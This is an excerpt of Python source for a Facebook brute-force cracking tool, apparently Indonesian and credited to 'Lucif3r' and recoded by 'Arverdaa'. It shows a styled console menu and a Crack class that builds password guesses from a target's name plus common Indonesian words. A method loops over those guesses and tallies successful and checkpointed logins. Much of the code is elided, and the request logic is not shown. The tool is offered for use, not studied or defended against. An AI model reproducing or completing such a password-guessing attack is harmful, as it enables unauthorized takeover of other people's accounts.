...
MULTI BRUTEFORCE FACEBOOK     
 Made By {M2}Indonesia {P2}Lucif3r
...
class Menu:
	...
	def menu(self):
		...
		self.jol = Console()
		self.tol = Console()
		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}• {H2}• {K2}• {H2}Negara {M2}• {H2}• {K2}•",subtitle=f"{M2}• {H2}• {K2}• {H2}Version : VERSI 2.1.0{M2} • {H2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Nama Akun       {P2}: {H2}{nama}\n {K2}Status Pengguna {P2}: {H2}PREMIUM PRIBADI\n {K2}Ip Address      {P2}: {H2}{self.ip}\n {K2}Tanggal         {P2}: {H2}{tgl}",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-KangColi {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		yonkou.append(Panel(f" {K2}Recode By {P2}: {H2}Arverdaa\n {K2}Github  {P2} : {H2}github.com\n{K2} Facebook {P2}: {H2}Arverdaa\n{K2} Whatsapp {P2}: {H2}+62*************",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-JandaPirang {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		self.jol.print(Columns(yonkou))
		cetak(Panel(f"{H2}Arverdaa",width=87,title=f"{H2}Thanks To",style=f"{color_panel}"))
...
class Crack:
					...
					try:
						...
						if len(nama)<=5:
							if len(depan)<3:
								...
								pwx.append(depan+"ganteng")
								pwx.append(depan+"cantik")
								pwx.append(depan+"gaming")
								pwx.append("ganteng")
								pwx.append("sayangku")
							...
							if len(depan)<3:
								...
								pwx.append("pekalongan")
								pwx.append("semarang")
								pwx.append("lupa sandi")
								pwx.append("anjing")
								pwx.append("bangsat")
								pwx.append("indonesia")
								pwx.append("akusayangkamu")
								pwx.append("booyah")
								pwx.append("booyah123")
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2}Lucif3r{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
...
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}].{H2} Kembali {P2})""",width=87,padding=(0,7),style=f"{color_panel}"))
		...
		if menu in["01","1"]:
			...
			Menu().menu()
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python baru.py""",width=87,style=f"{color_panel}")))
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
